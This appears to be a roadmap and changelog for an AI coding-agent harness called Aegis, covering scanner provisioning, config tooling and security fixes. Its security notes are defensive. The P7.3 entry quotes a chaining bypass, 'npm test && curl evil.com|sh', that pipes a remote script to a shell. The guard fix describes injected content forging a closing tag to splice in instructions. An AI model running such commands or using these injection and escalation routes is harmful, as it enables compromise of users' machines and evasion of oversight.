| trivy | brew | apt/dnf repo or install script | scoop/winget | `aquasec/trivy` |
| opengrep | brew | install script | container | `opengrep/opengrep` |
| semgrep | brew / pipx | pipx | container | `semgrep/semgrep` |
| gitleaks | brew | release binary | scoop | `zricethezav/gitleaks` |
| grype / syft | brew | install script | scoop | `anchore/grype`, `anchore/syft` |
| osv-scanner | brew | release / `go install` | scoop | `ghcr.io/google/osv-scanner` |
| hadolint / dockle | brew | release binary | scoop | `hadolint/hadolint`, `goodwithtech/dockle` |
| kubescape | brew | install script | — | `quay.io/kubescape/kubescape` |
| bandit / gosec | pipx / brew | pipx / `go install` | pipx | — |
| OWASP ZAP | — | — | — | `ghcr.io/zaproxy/zaproxy:stable` *(container-only, preferred)* |
| OWASP Dependency-Check | brew | install script | — | `owasp/dependency-check` |

Priority: **High** (turns the whole track from "works if you pre-installed everything" into
"works on a clean machine"), Effort: **M**.

**Shipped 2026-07-04, scoped to the 3 tools that exist today (semgrep/trivy/gitleaks) —**
the full install-method table above spans P11.3–P11.6's not-yet-built tools (opengrep,
grype/syft, osv-scanner, hadolint/dockle, kubescape, ZAP, Dependency-Check), so provisioning
for those ships alongside each tool's own item, using the same descriptor/CLI mechanism.
`security.ScannerDescriptor` (`internal/security/method.go`) carries the plain-language
summary and a per-OS (`darwin`/`linux`/`windows`) install command for each of the 3;
`aegis security install <tool>` (`internal/cli/security.go`) prints the summary + exact
command, prompts `[y/N]` (the **approval gate**), and — unless `--yes` is passed — only
runs the command after explicit confirmation. `--yes` is the CLI's own opt-in equivalent of
config's `install: always`; there is no agent-triggered install path yet (the
`security_scan` tool only scans, it never installs), so the "must not be silently
agent-triggered" requirement is trivially satisfied by not existing yet rather than by an
enforced gate — a real gap to close if/when an install tool is ever exposed to the model.
Test: `internal/cli/security_test.go` — `TestSecurityInstallAbortsWithoutConfirmation`
proves declining the prompt never runs the command; `TestSecurityInstallUnknownTool`.

### P11.11 — ✅ shipped 2026-07-04 (CLI) + 2026-07-04 follow-up (TUI form) — Security tool configuration + `/security-config`
A config surface so the user selects *which* tools to enable, *how* each runs, and *whether*
to auto-install when missing. `config.SecurityConfig` gained `Tools map[string]SecurityToolConfig`
(`enabled *bool`, `method`, `install`, `image`) and `DefaultMethod` (default `"auto"`).
`method: auto` prefers a present host binary, else the configured container image (P11.1);
`install` is stored in config today (`prompt`/`always`/`never`) but not yet read by any
code path, since there's no agent-triggered install to gate (see the P11.10 note above) —
wiring it in is a small follow-up once that exists, not a design gap.

Surfaces shipped:
- **`aegis security status`** — resolved method (host/container/unavailable) + exact reason
  per scanner, using the same `security.Resolve` the scanners call at scan time.
- **`aegis security config`** — prints the resolved `security.tools`/`default_method`
  (view-only; edit `.aegis/config.yaml`/`~/.config/aegis/config.yaml` directly — see
  `docs/configuration.md`).
- **`aegis security install <tool>`** — the P11.10 gated install.
- **`security.OptionsFromConfig`** (`internal/security/method.go`) — the availability
  resolver's config-translation seam, called identically by the `security_scan` tool,
  `aegis scan`, and every `aegis security` subcommand so they never disagree about how a
  tool would run.

**Follow-up shipped same day:** the interactive **`/security-config`** TUI form, requested
directly ("configure the security config in aegis so it doesn't have to be done via file
edits manually"). `internal/tui/securityconfig.go` (new) follows the existing
`wizard.go`/huh-form pattern: an async loading phase resolves each scanner's live
host/container/unavailable status (`security.Resolve`, off the main loop since container-
runtime probing can take a couple of seconds), then a list phase (`huh.Select`) to pick a
tool or save/cancel, then a per-tool edit phase (`huh.Confirm`/`Select`/`Input` for enabled/
method/install/image). Saving calls the same `config.PatchProjectSecurity`/
`PatchGlobalSecurity` the CLI's config-writing commands (`/sandbox use`, `/skills enable`)
already use — comment-preserving splice, not a full YAML round-trip — and carries
`EgressThenWrite`/`NetworkAllowList` through unchanged from the config as loaded, since
`patchSecurity` replaces the whole `security:` block wholesale and this dialog only means to
change scanner settings. `/security-config [global]` mirrors `/skills enable <name>
[global]`'s scope-argument convention (project default, `global` for the user-level file).
Tests: `internal/tui/securityconfig_test.go` (dispatch scope selection, `applyEdit` lands in
the working copy, save round-trip preserves the egress settings) and
`internal/config/write_security_test.go` (`PatchGlobalSecurity`/`PatchProjectSecurity`:
block creation, egress-policy preservation, other-sections preservation, explicit
`enabled: false` serialization).

Priority: **High**, Effort: **M**. P11.10 + P11.11 + P11.1 together are the "tool
availability" layer; shipped as a unit.

**Sequencing:** P11.1 (containerized runtime) and P11.2 (SARIF) are the enablers — every
later item is materially cheaper once they land, and P11.7/ZAP is blocked on P11.1. The
availability layer (P11.1 + P11.10 provisioning + P11.11 config/CLI) was the natural first
unit of work since it makes every scanner reliably runnable on a clean machine — now shipped.
Remaining order: P11.2 (SARIF) → P11.5/P11.6 (fast wins reusing trivy/new images) → P11.4 →
P11.3 → P11.7 (ZAP) → P11.8 → P11.9.

---

## Open Work — P9 (Engineering Quality — lower urgency, no current trigger)

P9.1, P9.2, and P9.5 are shipped (see [Appendix A](#appendix-a--completed-work)). Remaining:

### P9.3 — No OpenTelemetry/Prometheus export
TurnTrace/cost data is SQLite-only and pull-based. Fine for a single-operator daemon; becomes relevant the moment Aegis runs as shared infra someone wants in an existing metrics stack. No current trigger — don't build speculatively. Priority: **Low**, Effort: **M**.

### P9.4 — No per-task/complexity model routing
P5.9 only reroutes on failure. Nothing picks a cheaper model for simple turns and reserves an expensive one for hard turns (cf. Aider). Plausible cheap win given cost tracking already exists, but no evidence of demand. Priority: **Low**, Effort: **M**.

### P9.6 — No bulk export/import of session/memory stores
`internal/share` already exports a single session to Markdown/JSON/HTML (stronger than expected), but migrating the full session/`longmem`/`knowledge` SQLite stores to a new machine today means copying files by hand. Priority: **Low**, Effort: **S**.

**None of the remaining P9 items are blocking** — same posture as P6: real but no concrete trigger, don't build speculatively.

---

## Open Work — P6 (Long-Horizon / Exploratory)

### P6.1 — Mid-turn state persistence *(was P4.1)*
Persist partial turn state (accumulated assistant text, received tool calls) to SQLite during streaming so a crash mid-turn loses nothing. High complexity, low-probability failure mode; revisit if crash-during-long-turn becomes a reported pain point.

### P6.2 — A2A protocol integration *(was P4.2)*
Agent-to-Agent HTTP+SSE protocol (ADK Go 2.0, GA June 2026): `a2a_agent` client tool for calling remote agents + expose the daemon as an A2A server (`.well-known/agent.json` discovery). No SDK dependency — it's a protocol. Depends on P5.1 being stable (it is).

### P6.3 — MCP server mode
Expose Aegis itself as an MCP server (`aegis mcp-serve`): sessions and selected tools become MCP tools callable from other harnesses (Claude Code, Codex, editors). Complements A2A; the daemon API maps cleanly. Codex already does this and it materially expands where the harness can be embedded.

### P6.5 — Desktop / IDE surface beyond ACP
ACP covers Zed and Neovim; the web UI covers browsers. Evaluate: (a) VS Code extension speaking to the daemon API, (b) wrapping the web UI in a lightweight desktop shell. Only worth it if user demand materializes — the TUI is the product.

**None of P6.1/P6.2/P6.3/P6.5 are blocking.** P6.1 has no reported pain point; P6.2/P6.3 are interop bets with no current consumer; P6.5 is speculative. Don't build any of these without a concrete trigger — check with the user first.

---

## Appendix A — Completed Work

<details>
<summary><strong>P2 — all 9 items shipped 2026-07-01</strong></summary>

- P2.1 Ripgrep + `ls` directory tree tool
- P2.2 Bang `!` shell mode in TUI
- P2.3 Frecency-ranked @mention file autocomplete
- P2.4 File-change tracking in sidebar
- P2.5 Subagent footer strip
- P2.6 Max-step graceful degradation
- P2.7 Proactive context compaction (85% headroom check)
- P2.8 Conversation timeline dialog (`/timeline`)
- P2.9 Workflow agent primitives (sequential / parallel / loop)

</details>

<details>
<summary><strong>P3 — all 6 items shipped 2026-07-02</strong></summary>

- P3.1 Tiered long-term memory — SQLite FTS5 entity store (`internal/longmem`); `entity_remember` / `entity_recall` tools; ADK `BaseMemoryService`-compatible interface
- P3.2 Async/background task execution — `/detach` TUI command; daemon persists session to `bg_events` table; `aegis bg list/events` CLI; detached context survives TUI disconnect
- P3.3 DeepWiki-style project knowledge base — SQLite FTS5 index of docs/comments (`internal/knowledge`); `project_knowledge` tool with BM25 ranking and snippet extraction
- P3.4 Automatic rollback on tool failure — `git_sha` captured per checkpoint; `/rollback` TUI command runs `git reset --hard <sha>`; `GitRollback` flag on `RewindRequest`
- P3.6 Typed tool output schemas — optional `OutputSchemer` interface on `Tool`; `OutputSchema json.RawMessage` on `ToolSchema`; all built-in tools declare output schemas
- P3.7 Animation pause off-screen — spinner tick suppressed when `followBottom` is false; animation resumes automatically on scroll-back

</details>

<details>
<summary><strong>P4 — Core Harness Parity, all 6 items shipped 2026-07-02</strong></summary>

- P4.3 Skills progressive disclosure — `internal/skills` now injects a compact `<skills_available>` index (name + frontmatter `description:`); a `skill` builtin tool loads the full body on demand. Description-less skills fall back to eager injection.
- P4.3 extension (2026-07-04) — five skills embedded in the binary (content-review, html-report ported from `.aegis/skills`; security-audit, architecture-diagram, debug-investigation newly written) via `go:embed` in `internal/skills/builtin`, materialized to `<data_dir>/builtin-skills/` at daemon startup. Dormant by default (zero system-prompt cost); enabled per-name via `skills.builtin_enabled` config (project overrides global overrides built-in on a name collision), `aegis skills enable|disable|list` CLI, or `/skills enable|disable <name> [global]` TUI. Also fixed: `internal/memory`'s `loadSkills()` was eagerly re-injecting full (unstripped-frontmatter) skill bodies into the system prompt in parallel with `skills.BuildIndex`, which both duplicated bundled-skill content and silently bypassed progressive disclosure for any flat `.md` skill file with a `description:` — removed, `internal/skills` is now the single injection path.
- P4.4 User-configurable lifecycle hooks — `hooks:` config maps `pre_tool_use`/`post_tool_use`/`session_start`/`stop`/`subagent_stop` to shell commands (`internal/hooks` `Exec`); JSON event on stdin, exit 2 vetoes with stderr surfaced.
- P4.5 Headless structured output — `aegis chat --output-format text|json|stream-json`.
- P4.6 Deferred tool loading — `tool.Registry` gained `RegisterDeferred`/`Deferred`/`Load`/`SearchDeferred`; niche tools (latex, diagram, cron, lsp, longmem, team) are advertised as a `<deferred_tools>` one-liner and loaded via the `tool_search` meta-tool.
- P4.7 OS-level sandbox — `sandbox.backend: os` confines the local shell via macOS seatbelt / Linux bwrap; reported by `aegis sandbox detect`.
- P4.8 Close the loop — `git_pr` tool pushes the branch and opens a PR via `gh`, with a GitHub compare-URL fallback.

</details>

<details>
<summary><strong>P5 — all 9 items shipped 2026-07-02</strong></summary>

- P5.1 Agent teams — SQLite-backed shared task list (`swarm.TaskList`, `team_task_*` tools with atomic claim) + peer messaging (`team_send`/`team_inbox` over the file mailbox).
- P5.2 LSP tools — added `definition`, `hover`, `document_symbols`, `workspace_symbols`, `call_hierarchy` (registered deferred).
- P5.3 Pluggable web search — `search:` config selects brave/tavily/searxng; DuckDuckGo scrape remains the zero-config fallback.
- P5.4 Background notifications — `notify:` config fires desktop (osascript/notify-send/toast) and/or webhook on background-session completion/error.
- P5.5 @file#L10-40 line-range mentions — server expands `@path#L10-40` tokens in user messages to inline file excerpts before the engine call.
- P5.6 Draft stash — unsent textarea content saved to `.aegis/stash.json` on quit; restored on next session start.
- P5.7 Bundle install from git URL — `aegis bundle install/info <git-url>` clones `--depth=1` to temp dir and installs as a normal local bundle.
- P5.8 Semantic recall layer — `internal/embed` (Ollama `/api/embed` client, cosine similarity, reciprocal-rank fusion); `knowledge.Store` and `longmem.Store` gained an optional `Embedder` and a `docs_vec`/`mem_vec` BLOB vector table; `Search`/`SearchMemory` fuse BM25 + semantic rankings via RRF when `embeddings.enabled: true`, else BM25-only (default). `aegis knowledge index` CLI command added. Along the way, fixed a real gap: `knowledge.Store`/`longmem.Store` were built but never opened by the daemon — `project_knowledge`/`entity_remember`/`entity_recall` were dead tools; now wired into `internal/server`.
- P5.9 Provider failover — `provider.WithFailover` chains a primary adapter with ordered fallback targets, switching only on synchronous Stream failure after each target's own retry budget is exhausted (never mid-stream, so no partial output is replayed). `provider.fallback` config (ordered provider/model/base_url entries) + `provider.allow_cloud_fallback` guard: local→cloud failover is skipped with a warning unless explicitly opted in; cloud→cloud and any→local are never gated. `providerfactory.Build` assembles the chain.

</details>

<details>
<summary><strong>P7.1 — MCP capability laundering fixed, shipped 2026-07-03</strong></summary>

- `mcp.ServerConfig` gained `capability` (per-server default) and `tool_capabilities` (per remote tool name override) config fields; `internal/config.MCPServerConfig` and `internal/server` wiring pass them through.
- `internal/mcp/tool.go`: `mcpTool`/`mcpResourceListTool`/`mcpResourceReadTool`/`mcpPromptListTool`/`mcpPromptGetTool` all carry a resolved `tool.Capability` field instead of hardcoding `tool.CapNetwork`; `resolveCapability`/`parseCapability` default anything unlabeled/unrecognized to `tool.CapExecute` (most restrictive), matching the existing `internal/plugins` process-tool pattern.
- Net effect: an unlabeled or untrusted MCP server's tools now hit the `Ask` gate in build mode and are denied outright in plan mode, instead of the always-allowed `network` capability. Trusted servers opt back into `network` (or any other class) explicitly per-server or per-tool.
- Tests: `internal/mcp/mcp_test.go` — `TestParseCapabilityDefaultsToExecute`, `TestResolveCapabilityPerToolOverride`, `TestResolveCapabilityDefaultsExecuteWithNoConfig`.
- Docs updated: `docs/configuration.md` (MCP server example with `capability`/`tool_capabilities`), `docs/security.md` (`egress_then_write` network-capability description).

</details>

<details>
<summary><strong>P7.2–P7.7 — remaining security-hardening audit items, shipped 2026-07-03</strong></summary>

- **P7.2 (shell env leak):** `internal/sandbox/env.go` (new) strips `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (`DefaultStripEnv`) from `cmd.Env` in both `LocalBackend` and `OSBackend` (`local.go`, `os_sandbox.go`); `sandbox.strip_env` config (`config.SandboxConfig.StripEnv`) adds more names (e.g. MCP tokens from `.aegis/.env`) via `NewLocalBackendWithEnv`/`NewOSBackend`'s new param. Container backend untouched — `docker run`/`podman run` never passed host env into the container to begin with.
- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>` + newline), so `allow bash(npm test*)` no longer matches `npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
- **P7.4 (silent sandbox fallback):** sandbox backend selection extracted to standalone `server.selectSandbox` (testable in isolation); `sandbox.strict` config makes a failed `container`/`os` backend init a hard startup error instead of silently falling back to local. Non-strict fallback is recorded on `Server` and surfaced via `/healthz` (`api.HealthStatus.SandboxFallback`); `client.Status()` + `cli.warnSandboxFallback` print a warning banner in the TUI/`aegis ui` before entering a session.
- **P7.5 (persona mode escalation):** `persona.Persona` gained a `Loaded bool` field (true only for `*.md`-parsed personas, never built-ins); `server.resolveSessionMode` ignores a loaded persona's `mode: auto` when it's more permissive than the configured default and the caller didn't explicitly request a mode, logging a warning instead. Built-in personas remain fully trusted.
- **P7.6 (no bundle provenance check):** `bundle.Bundle.ContentHash()` computes a deterministic `sha256:`-prefixed digest over the manifest + every artifact file; `aegis bundle info` prints it, `aegis bundle install --expect-sha256 <hash>` aborts before writing anything on mismatch. Trust-on-first-use pinning, not a signature.
- **P7.7 (silent no-op deny rules):** `permission.WarnUnmatchableRules` (called once at startup against `tool.Registry.All()`, a new method) flags any non-`*`-pattern rule targeting a tool whose input schema has none of `subjectFor`'s recognized fields (`command`/`path`/`file_path`/`url`/`query`/`pattern`) — such a rule can never match, so it's logged instead of silently no-op'ing.
- Docs: `docs/configuration.md`, `docs/security.md`, `docs/permissions.md`, `docs/personas.md`, `docs/extensibility.md` all updated with the new config knobs/flags and their security rationale.

</details>

<details>
<summary><strong>P8 — Performance audit findings, all 6 items shipped 2026-07-03</strong></summary>

- **P8.1 (session store O(N²) rewrite):** `internal/session/session.go` gained `session_messages`/`session_traces` row-per-message/row-per-trace tables. `AppendMessages` (new) and `AppendTraces` (rewritten) now pure-`INSERT` new rows keyed by an incrementing `seq`, no more read-modify-write of the whole blob; `SaveMessages` keeps full-replace semantics (delete + reinsert) for the rewind/truncation case where earlier history itself changes. A one-time `migrateLegacyBlobs` backfills any pre-P8.1 whole-blob `messages`/`traces` columns into the row tables on first `Open()` after upgrade, then zeroes the legacy columns so it's a no-op on every later startup. `engine.Conversation` gained a `Persisted int` field (count of already-durable leading messages; `-1` means "rewritten in place, must fully re-save") that `repairOrphanedToolUses`/compaction reset via a new `invalidate()` helper; `server.go`'s per-turn save now calls `AppendMessages(conv.Messages[conv.Persisted:])` on the common path and only falls back to full `SaveMessages` when history was actually rewritten this turn. `Delete`/`Prune` clean up the new row tables too.
- **P8.2 (knowledge search full-corpus load):** `internal/knowledge/knowledge.go`'s `semanticRanking` now queries `docs_vec` (path+vector only) for the scoring pass, then a new `fetchSnippets` runs a second `WHERE path IN (...)` query for just the top-K survivors' title/body — no more pulling every document's full body into memory to rank.
- **P8.3 (swarm mailbox unbounded growth):** `internal/swarm/mailbox.go`'s `MarkRead` now moves the message file into a `processed/` subdirectory (instead of rewriting its `read` flag in place); `ReadAll(unreadOnly=true)` — the hot poll path used by the `team_inbox` tool — only lists the inbox directory, which now shrinks as messages are consumed instead of growing forever. `ReadAll(false)` still merges in `processed/` for full-history callers.
- **P8.4 (token estimation double-scan):** `engine.Conversation` gained a cached `estimatedChars()`/`charCountValid` pair; `Append` updates the cache incrementally, and anything that rewrites history calls the same `invalidate()` used by P8.1 to force a full recompute on next access. The two `estimateTokens` call sites (proactive-compaction check, zero-usage fallback) now share one scan per turn instead of two, and normal turns pay zero extra scan cost.
- **P8.5 (memory relevance TF-IDF recompute):** `internal/memory/relevance.go` gained `cachedEntries()` / `relevanceSnapshot`, keyed on a cheap `entriesSignature()` fingerprint (mtime+size per memory/skill file, no content read) stored on the existing `sourcesCache` (from `NewSources`); `allEntries()`/document-frequency build only reruns when a source file actually changed. `LoadRelevant` copies the cached entries before scoring so concurrent/sequential queries never mutate the shared cache.
- **P8.6 (execLock over-serializes reads):** `internal/engine/engine.go`'s `runTools` swapped `execLock sync.RWMutex` for a plain `sync.Mutex` taken only by write/execute tool calls; read/network calls no longer take any lock and run fully concurrently with a same-round write/execute call instead of blocking behind it.
- Tests: `internal/session/session_test.go` (`TestAppendMessagesIsIncremental`, `TestAppendMessagesMissingSession`, `TestSaveMessagesTruncates`, `TestDeleteRemovesMessageAndTraceRows`, `TestLegacyBlobMigration`), `internal/swarm/mailbox_test.go` (`TestMarkReadEvictsFromInbox`), `internal/memory/relevance_test.go` (`TestLoadRelevantCacheInvalidatesOnFileChange`).

</details>

<details>
<summary><strong>P9.1/P9.2/P9.5 — Eval harness, test coverage, spend caps, shipped 2026-07-03</strong></summary>

- **P9.1 (eval/regression harness):** new `internal/eval` package. A `Scenario` (system prompt + fully-built `engine.Options` + a sequence of user turns) runs against a real `engine.Engine` wired with a scripted/deterministic `provider.Adapter` — no live model, so it's part of `go test ./...` with no API key required. `Check` functions (`ExpectToolCalled`, `ExpectToolNotCalled`, `ExpectNoError`, `ExpectErrorContains`, `ExpectFinalTextContains`) assert on the `Result`; `AssertGolden` pins a deterministic JSON transcript per scenario under `internal/eval/testdata/`, regenerated via `AEGIS_EVAL_UPDATE=1 go test ./internal/eval/...`. Four scenarios ship as the initial suite (`internal/eval/scenarios_test.go`): a tool-call round trip (golden-pinned), plan-mode denying a write tool before `Execute` ever runs, a cost-budget abort stopping before its second turn, and multi-turn conversation continuity across two user turns. This exercises the interaction between engine, permission gate, and tool registry the way a real session would — regressions that only show up when those mechanisms combine won't necessarily trip a narrower per-mechanism unit test.
- **P9.2 (test coverage for trace/logging/api/client):** `internal/trace`, `internal/logging`, `internal/api`, `internal/client` all gained `_test.go` files (previously zero coverage). `internal/api`'s tests lock the on-the-wire `EventKind` strings and round-trip every wire type, since a silent rename there breaks the TUI/CLI without a compile error. Writing `internal/logging`'s tests surfaced a real bug: `ToStderr: true` with a `Path` set was replacing file output with stderr-only instead of mirroring both (contradicting the field's own doc comment) — fixed with `io.MultiWriter`, which is what `aegis serve --foreground` needs to keep a durable log file while also printing to the terminal.
- **P9.5 (spend caps):** `internal/config.CostConfig` gained `session_cap_usd` and `daily_cap_usd` (0 = unlimited, same convention as the existing `budget_usd`) plus `alert_threshold` (fraction, default 0.8). `internal/session.Store` gained a `daily_cost` table (`AddDailyCost`/`TodayCost`, keyed by UTC date) since the existing per-session `cost_usd` column can't answer "how much across all sessions today." `server.handlePostMessage` checks both caps before starting a turn (rejecting with 402 rather than the existing mid-run `budget_usd` abort, which is per-turn only) and emits a new `api.KindCostAlert` SSE event the turn that crosses `alert_threshold` of either cap (rendered in the TUI like the existing guard warning). This is additive to the pre-existing `budget_usd` single-run abort, not a replacement.
- Tests: `internal/eval/scenarios_test.go` (4 scenarios + golden transcript), `internal/api/api_test.go`, `internal/trace/trace_test.go`, `internal/logging/logging_test.go`, `internal/client/client_test.go`, `internal/session/session_test.go` (`TestTodayCostDefaultsToZero`, `TestAddDailyCostAccumulates`), `internal/server/server_test.go` (`TestSessionCostCapBlocksTurn`, `TestDailyCostCapBlocksTurn`, `TestCostAlertThresholdFires`).

</details>

<details>
<summary><strong>Persona QoL pass — advisory tool gate, CLI, default persona, shipped 2026-07-03</strong></summary>

Not a numbered roadmap item — a follow-through pass closing gaps left by the P7.5 persona-trust model and earlier persona hot-reload/full-profile-switch work.

- **`permission.PersonaToolGate`** (`internal/permission/persona_tools.go`, new): wraps the base gate with an advisory check against a persona's declared `Tools` list. Deliberately not a security boundary (same trust model as P7.5) — a tool call outside the list is logged and routed through the session's `Approver`: a non-interactive approver (e.g. auto mode) warns and allows, the TUI's interactive approver prompts and reuses its session-scoped allow-always cache. Declining blocks that call; approving (or an empty `Tools` list) always falls through to the real base gate.
- **`aegis persona` CLI** (`internal/cli/persona.go`, new): `list` (built-in/custom/default markers), `show <name>` (source, model, mode, tools, rules, guard, prompt; `--full` for the entire prompt), `new <name>` (scaffolds a commented frontmatter template, `--global` for the user directory), `use <name>` (writes `default_persona` to project or `--global` user config).
- **`default_persona` config** (`internal/config`): a new session with no explicit `--persona` resolves project `default_persona` → user-global `default_persona` → `general`. `config.PatchProjectDefaultPersona`/`PatchGlobalDefaultPersona` back the CLI's `use` subcommand.
- **Full-profile mid-session persona switch**: `api.UpdateSessionRequest` gained `Persona`; `/persona` in the TUI now switches the persisted persona name (so model/rules/guard re-resolve every turn, not just the system prompt) and applies the persona's default permission mode when the user hasn't set one explicitly, reporting the mode change.
- **Output guard rubric refinement**: `DefaultGuardRubric` and the `--first-init` template now explicitly excuse clearly-marked example/placeholder values in documentation (illustrative IPs, `<your-api-key>`-style tokens) from the "no placeholders" check, since those are legitimate and the real value was never supplied to the model.
- Tests: `internal/permission/persona_tools_test.go`, `internal/cli/persona_test.go`, `internal/config/write_persona_test.go`, plus updates to `internal/persona/load_test.go`, `internal/persona/persona_test.go`, `internal/server/server_test.go`.
- Docs: `README.md`, `CLAUDE.md`, `docs/cli-reference.md`, `docs/configuration.md`, `docs/personas.md` all updated in the same commit.

</details>

<details>
<summary><strong>P6.4 — Context editing / tool-result pruning, shipped 2026-07-03</strong></summary>

`compaction.pruneStaleToolResults` (`internal/compaction/prune.go`) runs as a deterministic pre-pass inside `Summarizer.Compact`, before any LLM call: `read_file` results for a path that was read again later are blanked to a one-line marker, and large `grep`/`glob`/`ls` dumps outside the trailing `keepRecent` window are truncated to a short preview. Never touches conversational text, tool errors, or the recent window. If pruning alone brings the estimate back under budget, `Compact` returns immediately — no summarizer call, no LLM cost.

</details>

<details>
<summary><strong>TQ — TUI Quality Track, all 11 items shipped (complete 2026-07-03)</strong></summary>

A code-level review of `internal/tui` against the Claude Code and opencode/Crush TUI experience found the recurring gap: Aegis rendered the conversation as one append-only styled string (`cappedBuffer` + wrap caches), while the streamlined harnesses model it as a list of typed message blocks rendered and cached individually. TQ1 fixed that structural gap; the rest is diff quality, streaming markdown, and interaction polish.

| # | Item | Shipped |
|---|------|---------|
| TQ1 | Block-based transcript model — `internal/tui/transcript.go`: `transcriptBlock` (raw ANSI content + per-block width-keyed wrap cache) replaces the old whole-buffer `cappedBuffer`/`wrapCache`; `liveBlock` keeps the settled-prefix boundary-cache trick so a long streaming reply stays O(tail) per token. Trimming drops whole blocks instead of severing content mid-line. | 2026-07-02 |
| TQ2 | Real unified diffs — LCS-based Myers diff in `toolview.go`; context lines, `+`/`-` markers, `@@ ... @@` separators between hunks. Replaces delete-all/add-all. | 2026-07-02 |
| TQ4a/b | Copy affordances — `/copy` copies last assistant message via `pbcopy`/`xclip`/`clip.exe`; `/copy N` copies Nth fenced code block; toast confirmation. | 2026-07-02 |
| TQ5 | Toggleable sidebar — `sidebarOpen bool` (default off); `ctrl+b` / `/sidebar` toggle; context %, cost, agent count folded into status bar when hidden. | 2026-07-02 |
| TQ7 | Live todo strip — intercepts `todo_add`/`todo_update`/`todo_list` tool results; renders `▣▶▢` progress strip above input with in-progress task text. | 2026-07-02 |
| TQ3 | Streaming markdown — the live tail renders through glamour incrementally: `liveBlock.render` takes a markdown-render callback, trailing newlines normalized so settled-prefix + tail concatenation is byte-identical to a whole-source render. No end-of-turn restyle "pop". | 2026-07-03 |
| TQ9 | Input polish bundle — `shift+enter` newline (Kitty key disambiguation, `ctrl+j` fallback); pasted image paths become `@image:` attachment tokens (`extractImageRefs`, regex-based, quoted-path support); ↑/↓ move the cursor inside a multiline draft with history nav only at first/last line; thinking blocks collapse to `✻ thought for Ns` (`ctrl+o` to expand). | 2026-07-03 |
| TQ8 | Message queueing — `alt+enter` during streaming queues the draft as the next user turn (dimmed `⏳ queued ▸` block); queued messages auto-send one per completed run at stream close. Explicit cancel or a stream error discards the queue. | 2026-07-03 |
| TQ6 | Richer approval flow — y/a/n banner replaced by an option-list dialog (`internal/tui/approval.go`): `Allow once / Allow always for pattern / Deny / Deny with feedback`, diff/command preview. "Allow always" derives a scoped pattern (`suggestRulePattern`) and persists it to `.aegis/config.yaml → permission.rules` (`config.AppendProjectPermissionRule`). "Deny with feedback" steers the typed reason back to the model. | 2026-07-03 |
| TQ10 | Theme system — the hardcoded Charmtone palette moved behind `colorScheme` (`internal/tui/colorscheme.go`) with `darkScheme`/`lightScheme` built-ins; `tui.theme` config key applied before styles are built; glamour markdown style and ANSI-16 shell-output remap follow the scheme. | 2026-07-03 |

Remaining cosmetic stretch ideas (not scheduled): TQ4c scoped mouse capture, terminal-background auto-detection for theme selection.

</details>

<details>
<summary><strong>Architecture/security review punch list — all 15 items shipped 2026-07-04</strong></summary>

Fixes for every item in `research/architecture-security-review-2026-07-03.md`'s prioritized punch list, an adversarial fresh-context review (five independent passes) run specifically to find interaction bugs between individually-correct features — the class of bug a checklist re-verification against P7/P8/P9 structurally can't catch. All 15 shipped in priority order; full test suite green throughout.

1. **Persona `rules:` escalation** — `server.filterPersonaRules` (new, `internal/server/server.go`) strips `Allow` rules from a loaded (untrusted) persona before merging into the session rule set, same trust gate `resolveSessionMode` already applied to `Mode` (P7.5). Deny rules pass through unchanged (narrowing access carries no escalation risk).
2. **Persona `output_guard: none` escalation** — `outputGuardConfig` now ignores `Guard.Disabled` from a loaded persona (logs a warning instead), closing the same class of gap for the last safety net.
3. **Unrecovered tool-panic crashes the daemon** — `engine.runTools`' per-call goroutine now `recover()`s a panic and reports it as an ordinary tool error, instead of taking down every concurrent session.
4. **Sub-agent fan-out multiplies spend** — a shared `*cost.Tracker` rides the run's `ctx` (`swarm.WithCostTracker`/`CostTrackerFromContext`) so every sub-agent at any depth (including background/detached spawns, and workflow-mode fan-out) draws against one `BudgetUSD` ceiling; `agent.go` also caps a `parallel` workflow at `maxParallelAgents` (8).
5. **Rewind races an in-flight turn** — `handleRewind` now acquires the same per-session semaphore `handlePostMessage` does, so a rewind can never truncate messages a concurrent turn is about to append to.
6. **Permission rules matched raw paths** — `permission.Rule` gained a `rePath` matcher; `normalizePathLike` (separator-unify + lexical clean + case-fold on case-insensitive OSes) closes the `./secrets/x`, case-variant, and backslash-vs-forward-slash evasions for Read/Write-capability rules.
7. **Transcript persistence wasn't actually incremental** — `handlePostMessage`'s `flushMessages` closure now runs on every `KindTurnDone`/`KindTrace` event (after each tool round), not once at the very end, so a crash mid-run loses at most the in-flight model call.
8. **Guard fails open on ambiguous verdicts + no injection hardening** — `parseVerdict` now fails *closed* on an unparseable reply (an actual transport error still fails open); `LLMGuard` wraps judged content in `<output>`/`<file>` tags with `escapeForGuard` neutralizing embedded angle brackets, so injected content can't forge a fake closing tag and splice in "instructions."
9. **MCP read loops die silently on oversized/malformed input** — `readLoop`/`listenSSE` scanners raised to `maxMCPScanTokenBytes` (8 MiB, from bufio's 64KB default); `Client.failPending` fails every in-flight and future call immediately once the read loop exits, instead of hanging forever on a dead connection.
10. **OpenAI reasoning models get the wrong token-limit field** — `isReasoningModel` routes o1/o3-class models (including vendor-prefixed ids) to `max_completion_tokens` instead of `max_tokens`, which those models reject outright.
11. **OS sandbox overstates its guarantee** — `docs/security.md`/`docs/configuration.md` now document (and `OSBackend`'s doc comment states) that seatbelt/bwrap confine writes and network only, not reads — a materially weaker claim than the container backend's full isolation.
12. **Budget dead zones + loop-detector blind spot** — the budget check now runs at the top of every engine iteration (covering guard retries and max-token continuations, not just the pre-tool-round path); `loopDetector` generalizes from "last N identical" to cycle detection up to period 4 (catches an alternating A/B pattern), and `turnSignature` canonicalizes tool input (normalizing timestamp/UUID/nonce-shaped scalars) so a single varying byte can't defeat it.
13. **Tool exposure/subprocess/mailbox isolation gaps** — `tool.Registry.Clone()` + a per-session registry (`Server.sessionToolRegistry`) scope `tool_search` loads to the requesting session instead of exposing process-wide; subprocess swarm workers get a process group (`Setpgid`) plus Linux `Pdeathsig`/Windows Job Object (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) so an abnormal daemon death doesn't orphan them; `Mailbox.MarkRead` now evicts `processed/` entries older than `processedRetention` (7 days).
